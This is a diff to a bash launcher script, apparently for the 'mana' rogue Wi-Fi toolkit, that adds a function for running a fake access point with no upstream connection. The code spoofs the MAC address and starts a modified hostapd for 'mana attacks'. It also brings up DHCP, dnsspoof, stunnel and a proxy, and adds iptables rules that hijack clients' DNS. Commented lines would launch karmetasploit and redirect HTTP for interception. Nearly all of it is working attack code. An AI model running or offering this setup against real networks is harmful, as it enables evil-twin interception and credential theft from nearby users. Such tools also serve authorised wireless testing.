@@ -462,9 +462,47 @@ iptables -A FORWARD -i $phy -o eth0 -j ACCEPT
         killem    #Kill all shit and exit
 }
 
-start-noupstream-eap(){
-	hangon && #Wait for Enter key
-	killem	  #Kill all shit and exit
+start-noupstream(){
+export conf="$share/run-mana/conf/hostapd.conf_wpa2"
+echo -e "$txtgrn [*] Checking if AP-mode supported interface is present $endclr"
+ ./$0 --check_ap_mode    #Check if "AP-mode" supported interface is present
+echo -e "$txtgrn [*] Stopping network-manager & unblocking wifi $endclr"
+ ./$0 --clearwifi        #Stop network-manager &rfkill unblock wifi
+echo -e "$txtgrn [*] Changing MAC $endclr"
+ ./$0 --start_macchanger #Change mac
+  sleep 4
+echo -e "$txtgrn [*] Starting hostapd $endclr"
+ ./$0 --start_hostapd && #Hostapd - Start modified hostapd that implements new mana attacks
+
+#sed -i "s/^set INTERFACE .*$/set INTERFACE $phy/" $share/run-mana/conf/karmetasploit.rc
+
+echo "Starting hostapd"
+$hostapd $conf&
+#hostapd $share/run-mana/conf/hostapd.conf&
+  sleep 5
+
+ifconfig $phy 10.0.0.1 netmask 255.255.255.0
+route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1
+
+dnsmasq -z -C $share/run-mana/conf/dnsmasq-dhcpd.conf -i $phy -I lo
+dnsspoof -i $phy -f $share/run-mana/conf/dnsspoof.conf&
+service apache2 start
+stunnel4 $share/run-mana/conf/stunnel.conf
+tinyproxy -c $share/run-mana/conf/tinyproxy.conf&
+#msfconsole -r $share/run-mana/conf/karmetasploit.rc& #Remove "&" to fix msfconsole exiting
+
+echo '1' > /proc/sys/net/ipv4/ip_forward
+iptables --policy INPUT ACCEPT
+iptables --policy FORWARD ACCEPT
+iptables --policy OUTPUT ACCEPT
+iptables -F
+iptables -t nat -F
+iptables -t nat -A PREROUTING -i $phy -p udp --dport 53 -j DNAT --to 10.0.0.1
+iptables -A FORWARD -i $phy -o eth0 -j ACCEPT
+#iptables -t nat -A PREROUTING -i $phy -p tcp --destination-port 80 -j REDIRECT --to-port 10000
+
+        hangon && #Wait for Enter key
+        killem    #Kill all shit and exit
 }
 
 start-redirector(){
